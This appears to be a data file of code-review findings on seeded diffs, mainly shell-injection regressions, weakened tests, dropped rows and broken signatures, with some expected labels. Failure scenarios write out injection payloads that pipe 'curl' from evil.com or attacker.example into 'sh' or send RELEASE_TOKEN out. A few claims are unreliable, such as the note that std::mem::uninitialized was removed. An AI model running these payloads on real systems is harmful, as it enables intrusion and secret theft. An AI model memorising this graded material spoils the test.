findings.failure_scenario: If `rows.slice(1)` were accidentally changed to `rows` (reverting to old behavior) or to `rows.slice(0)`, the test would still pass because both results are truthy arrays. The slicing behavior introduced by this change is completely untested.
findings.title: Test assertion weakened to toBeTruthy, no longer verifies rows.slice(1) behavior

findings.body: The spec requires 'Report commands shall not interpolate input into a shell.' The import was changed from `spawnSync` (which accepts an args array and does not invoke a shell) to `execSync` (which runs its argument through `/bin/sh`). This is the import half of the regression that lets the next two lines interpolate `userName` into a shell.
findings.failure_scenario: Combined with the `execSync(command)` call below, any `userName` containing shell metacharacters (e.g. `alice; rm -rf ~`) is executed as a shell command, giving arbitrary code execution under the process's privileges.
findings.title: Import switched to execSync, enabling shell interpolation

findings.body: The spec requires 'Report commands shall not interpolate input into a shell.' The new code builds a command string via a template literal and hands it to `execSync`, which executes it through a shell. This directly contradicts the spec and is a command-injection vulnerability. The original `spawnSync("report", ["--user", userName])` passed arguments as an array and never touched a shell.
findings.failure_scenario: A `userName` like `alice; cat /etc/passwd` causes `cat /etc/passwd` to run as a shell command, leaking sensitive data or allowing arbitrary code execution depending on the payload.
findings.title: execSync interpolates userName into a shell command

findings.body: Applying .trim().toLowerCase() to a user identifier before lookup silently changes the key used to fetch the row. If the database stores IDs in a case-sensitive or whitespace-sensitive form (UUIDs, opaque tokens, mixed-case identifiers, or values with intentional leading/trailing whitespace), this normalization will cause legitimate lookups to miss the row and may collide different users onto the same record. It also lets an attacker who knows a target's ID submit a variant (extra spaces, different case) and still resolve to the same user, which is an IDOR-adjacent concern when the ID is treated as a secret. Identifier values should be compared exactly as issued; if canonicalization is required, do it at issuance time, not at every lookup.
findings.failure_scenario: A caller passes a UUID with surrounding whitespace or mixed case; the query returns no row (or the wrong row) because the normalized value no longer matches the stored identifier, breaking authentication/authorization decisions that depend on this lookup.
findings.suggestion: return db.query("SELECT * FROM users WHERE id = ?", [userId]);
findings.title: Normalizing user IDs can cause IDOR and lookup collisions

findings.body: The new code interpolates `user` directly into a shell command string passed to `sh -c`. A caller passing a value containing shell metacharacters (e.g. `alice; rm -rf ~` or `$(curl evil.com/x | sh)`) will execute arbitrary commands on the host. The previous version used `Command::new("report").args([...])`, which passes arguments as a single argv vector and is not vulnerable to shell metacharacter expansion. The change both regresses security and contradicts the stated intent of "preserving report rows for named users" — there is no need to invoke a shell to do that.
findings.failure_scenario: render_report("alice; touch /tmp/pwned", ...) causes `sh -c "report --user alice; touch /tmp/pwned"` to execute, running the injected command with the privileges of the process.
findings.title: Command injection via unsanitized user input

findings.body: The renamed test `returns_rows` only asserts the result is non-empty. It does not check that the rows match the input, that the first row is preserved, or that the user argument is honored. Combined with the `skip(1)` in `render_report`, this test will pass even though the first row is silently dropped — exactly the regression the commit claims to prevent. The original `preserves_rows` test compared the full output to the input and would have caught this.
findings.failure_scenario: A regression that drops, reorders, or corrupts rows goes undetected because the assertion only checks `!is_empty()`.
findings.title: Test no longer verifies row preservation

findings.body: The function now returns `rows.into_iter().skip(1).collect()`, which discards the first element of every input vector regardless of its content. The previous version returned all rows. The commit message claims to "preserve report rows for named users", but the implementation drops a row for every call, including the named-user case. There is no conditional on `user` that would justify skipping only when the user matches some criterion.
findings.failure_scenario: render_report("alice", vec!["first", "second"]) returns ["second"] instead of ["first", "second"], losing the first row of every report.
findings.title: skip(1) drops the first row unconditionally

findings.body: std::mem::uninitialized() was deprecated in Rust 1.39 and removed in later editions because it permits reading uninitialized memory, which is undefined behavior for any type with a Drop impl, validity invariant, or non-zero initializer. UserRecord is constructed from arbitrary bytes and then passed to UserRecord::merge, which will read those bytes — if any field is a reference, Box, NonNull, or has a Drop impl, this is UB. Even for plain data, the compiler is allowed to assume the value is initialized and elide checks, producing arbitrary results.
findings.failure_scenario: Any call to fetch_user constructs a UserRecord from uninitialized stack memory and then reads it via UserRecord::merge. If UserRecord contains a Drop type, the destructor runs on garbage pointers, causing memory corruption or arbitrary code execution. If it contains references or NonNull, reading them is immediate UB. Even for Copy types, the compiler may assume the value is initialized and optimize away subsequent validation.
findings.title: Use of deprecated std::mem::uninitialized() is unsound

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message claims the refactor keeps fetch_user source compatible, but the signature changed from `fetch_user(id: &str, timeout_ms: Option<u64>) -> UserRecord` to `fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64)`. Every existing caller passing `Option<u64>` or expecting a bare `UserRecord` will fail to compile. The return type also changed from a single record to a tuple, which is a breaking change for all callers.
findings.failure_scenario: Any caller that previously wrote `let user = fetch_user("abc", Some(1000));` or `let user = fetch_user("abc", None);` will no longer compile, because the second argument is no longer Option<u64> and the return is no longer UserRecord. The stated 'source compatible' intent is contradicted by the diff.
findings.title: Signature change breaks source compatibility

findings.body: The new return tuple includes `timeout_ms` as the second element, but the function only ever receives and returns the same value. This is a dead field in the return type — callers already have the timeout they passed in. It also forces every caller to destructure a tuple to get the record, which is the source-compatibility break noted above.
findings.failure_scenario: Callers must now write `let (user, _) = fetch_user(...)` or destructure the tuple to recover the UserRecord they used to get directly, with no compensating benefit since the timeout value is identical to the one they passed in.
findings.title: Returning timeout_ms unchanged adds no value

expected.label: required timeout and tuple break source compatibility

findings.body: The function now calls `root.canonicalize()` and `root.join(name).canonicalize()`. On any platform, `canonicalize` on a path that does not exist returns an error of kind `io::ErrorKind::NotFound` (or `InvalidInput` on some platforms for symlink loops). The previous behavior was to return whatever `File::open` returned, which preserved the actual error kind. After this change, opening a report that does not exist will surface as `NotFound` from the second `canonicalize` call — that part is fine — but the `strip_prefix` check only fires when the candidate exists and is canonicalizable. If the candidate does not exist, the function returns `NotFound` before the prefix check, which is correct. However, the `strip_prefix` error is mapped to `PermissionDenied`, which is misleading: a path that escapes the root via `..` is not a permission error, it is a path-traversal / invalid-input error. Callers checking for `PermissionDenied` to decide whether to retry with elevated privileges will be misled, and security-monitoring code that looks for `PermissionDenied` to flag access-control events will miss the real issue.
findings.failure_scenario: A caller passes `name = "../etc/passwd"`. `canonicalize` succeeds (the file exists), `strip_prefix` fails, and the function returns `io::Error::from(io::ErrorKind::PermissionDenied)`. The caller treats this as a permissions problem and may prompt for re-authentication or log it as an ACL violation, when the actual cause is a path-traversal attempt that should be reported as invalid input.
findings.title: Canonicalize on a non-existent path returns NotFound, not PermissionDenied

findings.body: The function canonicalizes the candidate path, verifies it stays under `root`, and then opens it. Between the `canonicalize` call and the `File::open` call, the filesystem can change: a symlink at the canonicalized location could be replaced, or the file could be moved and replaced with a symlink pointing outside `root`. The check is not atomic with the open, so a path-traversal guard that looks correct at check time can be bypassed at open time. This is a classic TOCTOU (time-of-check-to-time-of-use) vulnerability. On Unix, the safe pattern is to open the directory as a file descriptor and use `openat` with `O_NOFOLLOW` so the lookup happens in a single syscall relative to a trusted handle.
findings.failure_scenario: An attacker who can write inside `root` (e.g. a shared upload directory) places a regular file at `root/report.txt`, waits for the caller to canonicalize and validate it, then replaces `report.txt` with a symlink to `/etc/passwd` before `File::open` runs. The caller opens the symlink target outside `root`, bypassing the prefix check.
findings.title: TOCTOU race between canonicalize and File::open

findings.body: The `user` parameter is interpolated directly into a shell command string and then executed via `sh -c`. Any shell metacharacter in `user` (`;`, `&&`, `|`, `$()`, backticks, redirections, etc.) is interpreted by the shell, giving the caller arbitrary command execution on the host. The previous implementation passed `user` as a separate argv element to `Process.run`, which is not interpreted by a shell and is safe.
findings.failure_scenario: An attacker supplies a username such as `alice; curl http://evil/x | sh` or `$(malicious_command)`. The constructed command becomes `report --user alice; curl http://evil/x | sh`, and `sh -c` executes the attacker's payload with the privileges of the Dart process.
findings.title: Fix OS command injection via shell interpolation of user input

findings.body: The function now returns `rows.sublist(1)`, discarding the first element of the input list. There is no documented reason for this, and the test was weakened to `isNotNull` so the regression is not caught. Any caller expecting the full row set will silently lose the first row.
findings.failure_scenario: A caller passing ['header', 'row1', 'row2'] receives ['row1', 'row2']; the header (or first data row) is lost with no error.
findings.title: Dropping the first row silently corrupts output

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting the returned list equals `['first', 'second']` to asserting only `isNotNull`. This silently accepts any return value, including an empty list, a truncated list, or a list with reordered rows, and hides the behavioral regression introduced by `rows.sublist(1)`. The original assertion should be restored (and updated only if the new behavior is genuinely intended and documented).
findings.failure_scenario: Any future change that drops, reorders, or corrupts rows will pass the test, so regressions in `renderReport` will reach production undetected.
findings.title: Restore exact-equality assertion in renderReport test

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. A user value containing shell metacharacters (e.g. `; rm -rf /`, `$(...)`, backticks) will be executed by the shell. This is a textbook command injection vulnerability.
findings.failure_scenario: Calling renderReport('alice; curl evil.com | sh', rows) causes the shell to execute the injected command after the report command, leading to arbitrary code execution under the process's privileges.
findings.title: Command injection via unsanitized user input

findings.anchor: (Map<String, Object?>, int) fetchUser(String id, int timeoutMs) {
findings.body: The function previously returned `Map<String, Object?>`; it now returns a record `(Map<String, Object?>, int)`. The commit message claims to keep callers compatible, but every existing caller that destructures or uses the map directly will break. The map also no longer contains `timeoutMs` or `fetchedAt`, and `timeoutMs` is now a required positional parameter instead of an optional one with a default.
findings.failure_scenario: Existing callers that do `final user = fetchUser(id);` and then read `user['timeoutMs']` or `user['fetchedAt']` will get a runtime type error (record is not a Map) or a missing-key error. Callers that relied on the default `timeoutMs = 30000` must now pass it explicitly or compilation fails.
findings.title: Return type changed from Map to record, breaking callers

findings.body: The previous contract returned `{'id': id, 'timeoutMs': timeoutMs, 'fetchedAt': DateTime.now().toUtc()}`. The new map only contains `id` and `origin`, and `fetchedAt` is gone. Any caller that read `timeoutMs` or `fetchedAt` from the returned map will silently get `null`/missing keys.
findings.failure_scenario: A caller doing `fetchUser(id)['fetchedAt']` now returns null instead of a timestamp, silently breaking any logic that depended on the fetch time being present in the result.
findings.title: Returned map drops timeoutMs and fetchedAt fields

findings.body: The `user` parameter is concatenated directly into a string passed to `/bin/sh -c`, which invokes the shell to parse the command. Any caller-controlled value for `user` is therefore interpreted as shell syntax, not as a single argument. The previous implementation used `ProcessBuilder` with discrete arguments, which bypasses the shell and is not vulnerable to this class of injection. The new form is a textbook command-injection sink.
findings.failure_scenario: A caller passes `user = "alice; curl http://attacker.example/x | sh"` (or any value containing `;`, `|`, backticks, `$()`, etc.). The shell executes the injected command with the privileges of the JVM, leading to remote code execution, data exfiltration, or full host compromise.
findings.title: Fix OS command injection via /bin/sh -c concatenation

findings.body: `rows.subList(1, rows.size())` returns a view starting at index 1 and ending at `rows.size() - 1`, so the first element of `rows` is silently dropped. For a list with one element, `subList(1, 1)` is empty, and for an empty list it throws `IndexOutOfBoundsException` because `1 > 0`.
findings.failure_scenario: Calling `render` with `List.of("first", "second")` returns `["second"]` instead of the original list, and calling it with an empty list throws `IndexOutOfBoundsException`.
findings.title: Off-by-one: subList(1, size) drops the first row

findings.body: The test was downgraded from `assertEquals(List.of("first", "second"), ...)` to `assertNotNull(...)`. The weaker assertion no longer verifies that the returned rows match the input, so it cannot detect the `subList(1, rows.size())` regression in `ReportService.render` and gives a false sense of coverage for the new shell-invocation code path. A test that only proves the method returns *something* provides essentially no protection against the very class of bug this PR introduces.
findings.failure_scenario: If `render` is later changed to return an empty list, a truncated list, or `null` (e.g., after the shell call throws and a future refactor swallows it), the test still passes and the defect ships to production.
findings.title: Restore the content-checking assertion that was weakened

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The commit message claims to 'preserve UserClient caller compatibility', but the return type was changed from `User` to `Map.Entry<User, Integer>`. Any caller that previously invoked `fetch(...)` and used the result as a `User` will no longer compile, directly contradicting the stated intent. Additionally, the `timeoutMs` parameter type was changed from `Integer` (nullable) to primitive `int`, which is a source-incompatible change for callers passing `null` or `Integer` references.
findings.failure_scenario: A caller written against the old signature (e.g. `User u = client.fetch(id, null);`) will fail to compile after this change because the method now returns `Map.Entry<User, Integer>` and no longer accepts a null timeout.
findings.title: Return type changed from User to Map.Entry, breaking caller compatibility

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: `Date.toGMTString()` has been deprecated since Java 1.1 in favor of `DateTimeFormatter`-based formatting. The modern equivalent for an RFC 1123 / IMF-fixdate string is `DateTimeFormatter.RFC_1123_DATE_TIME` applied to an `Instant` (or `ZonedDateTime`). The file currently only imports `java.util.Date`; the replacement needs `java.time.Instant` and `java.time.format.DateTimeFormatter` added to the import block.
findings.failure_scenario: Compilers emit deprecation warnings on every call, and the method is a long-standing removal candidate; future JDK releases could drop it and break the build.
findings.title: Replace deprecated Date.toGMTString()

findings.body: The `user` argument is concatenated directly into a string passed to `sh -c`, turning every call into a shell-interpolated command. Any caller (or upstream source) that can influence `user` can break out of the intended `report --user <name>` invocation and execute arbitrary shell commands under the process's privileges. The previous form passed `user` as a separate argv element to `exec.Command`, which is safe because no shell is involved and the binary receives the value verbatim.
findings.failure_scenario: An attacker supplies a `user` value such as `alice; rm -rf / #` or `$(curl evil.example/x|sh)`. The shell spawned by `sh -c "report --user "+user` evaluates the metacharacters and runs the injected payload with the privileges of the Go process, leading to remote code execution, data exfiltration, or destructive actions.
findings.title: Fix OS command injection by avoiding shell concatenation

findings.body: The previous test asserted that `Render` preserved both rows and their order. The replacement only checks that the return value is non-nil, which is true for any non-empty input slice regardless of whether the function works correctly. The new `rows[1:]` behaviour, the shell call, and the user argument are all untested. A regression that returns `nil`, an empty slice, or the wrong rows would pass.
findings.failure_scenario: A future change breaks `Render` (e.g. returns `rows[2:]`, returns `nil`, or panics on empty input). The test still passes because it only checks `!= nil`, so the regression ships undetected.
findings.title: Test no longer covers the function's contract

findings.title: Off-by-one: rows[1:] drops the first element

The new implementation returns rows[1:], dropping the first element, but the replacement test only checks that the result is non-nil. The behavioural change — that the first row is now skipped — is completely uncovered, so a regression that drops more (or fewer) rows would pass.

findings.title: Test no longer covers the changed behaviour

findings.body: The commit message claims an efficiency design, but the new body calls repo.Load(id) once per id inside a for-loop, replacing the original single repo.LoadMany(ids) batch call. This is the classic N+1 pattern: one repository round-trip per id instead of one round-trip for the whole batch. For any non-trivial id slice it is strictly slower and puts more load on the data source than the implementation it replaced, which is the opposite of what the stated intent advertises.
findings.failure_scenario: When Enrich is called with N ids, the repository performs N separate Load calls instead of one LoadMany, multiplying per-call latency and backend load by N and contradicting the 'efficiency' framing of the commit.
findings.title: Loop of Load calls replaces LoadMany, contradicting the efficiency intent

findings.body: `ResultSliceFactory` is a struct with a single method that returns `[]Item{}` — the zero value of a slice. It has one caller, adds a layer of indirection, and exists only to construct an empty slice. A plain `var results []Item` (or `results := []Item{}`) does the same thing without the type, the method, and the awkward `(ResultSliceFactory{}).Create()` call site. The factory type and its method should be deleted along with this call.
findings.title: Remove the needless ResultSliceFactory abstraction

findings.body: The original Enrich returned every item from LoadMany unchanged. The new implementation silently drops items where Active is false, Owner is nil, or Owner.Enabled is false. The commit message only advertises an efficiency design; it says nothing about changing which items are returned. This is an out-of-scope behavior change that callers will observe as missing data with no signal in the changelog.
findings.failure_scenario: A caller that previously received every loaded item now receives only the subset that is Active and has a non-nil, enabled Owner, silently losing items that the old contract returned.
findings.title: Filtering was added without being mentioned in the intent

This silently masks a real failure mode and leaves the caller with a half-populated User struct.

findings.body: Switching the trigger to `pull_request_target` while also checking out the PR head SHA and exposing `RELEASE_TOKEN` to `npm test` creates a classic pwn-request vulnerability. `pull_request_target` runs the workflow in the context of the base repository with access to secrets, but the added `ref: ${{ github.event.pull_request.head.sha }}` causes the runner to check out the attacker's commit. The subsequent `npm test` step then executes that untrusted code with `RELEASE_TOKEN` in its environment, allowing any contributor to open a PR that steals the token. Revert the trigger to `pull_request`, drop the explicit `ref` (the default already checks out the PR head), and remove the `RELEASE_TOKEN` env entry — secrets must never be passed to code that originates from a PR. If the token is genuinely required for the test job, split the workflow: run untrusted test code in a `pull_request` job with no secrets, and run any secret-needing steps in a separate `pull_request_target` (or `workflow_run`) job that does not check out PR code.
findings.failure_scenario: An attacker opens a pull request containing a malicious `package.json` (e.g., a `pretest`/`posttest` script, or a dependency whose `postinstall` runs `curl https://attacker.example/?t=$RELEASE_TOKEN`). The workflow triggers on `pull_request_target`, checks out the attacker's commit, and `npm test` executes the payload with `RELEASE_TOKEN` in the environment, exfiltrating the secret.
findings.title: Revert pull_request_target to prevent pwn-request secret exfiltration

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The new code builds a shell command string from `user_name` and runs it with `shell=True`. Any shell metacharacters in `user_name` (e.g. `; rm -rf ~`, `$(...)`, backticks) are interpreted by the shell, giving arbitrary command execution. The previous version passed a list with `check=True` and no `shell=True`, which avoided this entirely.
findings.failure_scenario: A caller passes a user_name like `alice; curl evil.example/x | sh`; subprocess.run invokes /bin/sh -c, the shell parses the metacharacters, and the attacker's command runs with the privileges of the report process.
findings.title: Command injection via shell=True with user-controlled input

findings.body: The subprocess call uses `shell=True` to run a single fixed command with one argument. There is no shell feature being used (no pipes, globs, redirects, or variable expansion), so `shell=True` adds risk without benefit. The original list-form invocation was both safer and sufficient.
findings.failure_scenario: Even with a benign user_name, leaving shell=True in place keeps the injection vector open for any future caller that passes untrusted input, and is a code-smell that invites further unsafe string-built commands.
findings.title: shell=True is unnecessary and unsafe here

findings.body: The function now returns `rows[1:]`, discarding the first element of the input list. Nothing in the diff explains why the first row should be dropped, and the previous behavior returned the full list. Callers that pass a header row or any list where the first element matters will silently lose data.
findings.failure_scenario: A caller passes `["header", "row1", "row2"]` expecting the full list back; render_report returns `["row1", "row2"]` and the header is lost with no error.
findings.title: rows[1:] silently drops the first row

findings.body: The previous test asserted that `render_report` returns the input rows unchanged. The new test only checks that the return value is not None, which would pass even if the function returned an empty list, a single string, or a completely different object. The behavioural change in `report.py` (returning `rows[1:]` instead of `rows`) is therefore not covered, and the test gives a false sense of safety.
findings.failure_scenario: If `render_report` regresses to return `rows` (the old behaviour) or to return `[]`, the test still passes, so the change to `rows[1:]` is unverified and a future regression would ship silently.
findings.title: Test no longer asserts the documented behaviour

findings.body: The new code builds a command string by interpolating `user_name` directly into a shell command and runs it with `shell=True`. Any caller able to influence `user_name` (a web request, a config file, a CLI flag) can inject arbitrary shell metacharacters — e.g. `user_name = "alice; rm -rf ~"` — and have them executed by the parent shell. The previous version passed an argument vector without a shell, which is the safe form. The spec explicitly requires an argument vector without a shell, so this change also contradicts the spec.
findings.failure_scenario: A caller passes user_name='alice; curl evil.example/x | sh' → subprocess.run invokes /bin/sh -c 'report --user alice; curl evil.example/x | sh' → arbitrary code execution as the report process.
findings.title: Shell-injection via shell=True with user-controlled input

    return {"id": user_id, "fetched_at": datetime.now(UTC), "timeout": timeout}

findings.body: PurePath(user_id).name extracts only the final path component, but it does not validate that the input is a safe identifier. An attacker can supply a value like '../../admin' or a string containing null bytes, and the resulting 'normalized_id' is still attacker-controlled and is then used as a SQL parameter. While the parameter is bound (so SQL injection is prevented), the value passed to the database is not a validated user identifier — it is whatever the attacker chose as the last path segment. This silently changes the semantics of the lookup and can mask injection-style payloads, log forging, or unexpected lookups.
findings.failure_scenario: An attacker supplies user_id='../../admin' or 'user\x00malicious'; PurePath(...).name returns 'admin' or 'user', which is then used as the bound parameter. The query returns a row for a different user than the caller requested, enabling IDOR-style access to arbitrary accounts.
findings.title: Path traversal via PurePath on user_id

findings.body: userName is interpolated directly into a shell command string passed to execSync, which runs the command through a shell. A userName containing shell metacharacters (e.g. `; rm -rf /`, `$(...)`, backticks) will be executed by the shell rather than treated as a single argument. The previous implementation used spawnSync with an argument array, which avoided this.
findings.failure_scenario: If renderReport is called with a userName like `alice; curl evil.com/x | sh`, execSync executes the injected command, leading to arbitrary code execution on the host.
findings.title: Command injection via unsanitised userName

findings.body: The spec requires that rendering preserve every input row in order. The new return statement is `rows.slice(1)`, which discards the element at index 0 and returns only the tail of the array. The previous implementation returned `rows` unchanged. This directly contradicts the 'preserve every input row' requirement.
findings.failure_scenario: Calling `renderReport('alice', ['first', 'second', 'third'])` returns `['second', 'third']`, silently losing the first row of the report on every invocation.
findings.title: rows.slice(1) drops the first input row, violating preservation requirement

findings.body: The previous assertion `toEqual(["first", "second"])` directly verified the spec's 'preserve every input row in order' requirement. It has been replaced with `toBeDefined()`, which passes for any non-null return value and would not catch the `rows.slice(1)` regression introduced in `report.ts`. The test name was also changed from 'preserves report rows' to 'returns report rows', dropping the preservation claim from the test's stated intent. The acceptance criterion for row preservation now has no test guarding it.
findings.failure_scenario: The `rows.slice(1)` bug ships undetected because the only test asserts only that the return value is defined, not that it equals the input rows.
findings.title: Test weakened to toBeDefined, no longer covers the row-preservation criterion

findings.body: The spec requires that report commands avoid shell interpretation. The new code builds a command string via template literal (`report --user ${userName}`) and passes it to `execSync`, which executes its argument through a shell by default. This is the opposite of the previous `spawnSync(..., [...args], ...)` form, which passed arguments as an array and bypassed the shell. Any metacharacter in `userName` (e.g. `;`, `$`, backticks) is now interpreted by the shell, turning a previously safe call into a command-injection vector. To satisfy the spec, revert to `spawnSync` with an argument array and restore the matching import.
findings.failure_scenario: A userName containing shell metacharacters (e.g. `alice; rm -rf ~` or `$(curl evil.example)`) is interpolated into the command string and executed by the shell, allowing arbitrary command execution under the process's privileges.
findings.title: execSync with interpolated string reintroduces shell interpretation

findings.anchor: export function fetchUser(id: string, timeoutMs: number): [Record<string, unknown>, number] {
findings.body: The commit message claims to 'retain fetchUser compatibility', but the signature change from `(id, timeoutMs = 30_000) => Record<string, unknown>` to `(id, timeoutMs: number) => [Record<string, unknown>, number]` is a breaking change. The default value for `timeoutMs` is removed (callers that omitted it will get `undefined`, which is not assignable to `number`), and the return type changed from an object to a tuple. Existing callers destructuring the object or relying on the default will break.
findings.failure_scenario: Any caller that invokes `fetchUser(id)` without a second argument now passes `undefined` for a parameter typed `number`, causing a TypeScript compile error. Any caller that reads `result.timeoutMs` or `result.fetchedAt` from the returned object now receives a tuple and gets `undefined` for those properties, breaking the application at runtime.
findings.title: Breaking change contradicts 'retain compatibility' intent

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: toGMTString() has been deprecated since ECMAScript 1. The modern replacement is toISOString(), which returns an ISO 8601 formatted string (e.g., "2024-01-15T10:30:00.000Z"). The previous version of this function already used toISOString(); the diff regressed to the deprecated form.
findings.failure_scenario: Using a deprecated API may produce console warnings in some environments, and the method could be removed in future language versions, breaking the timestamp serialization.
findings.suggestion: return [{ id, fetchedAt: new Date().toISOString() }, timeoutMs];
findings.title: Replace deprecated toGMTString() with toISOString()
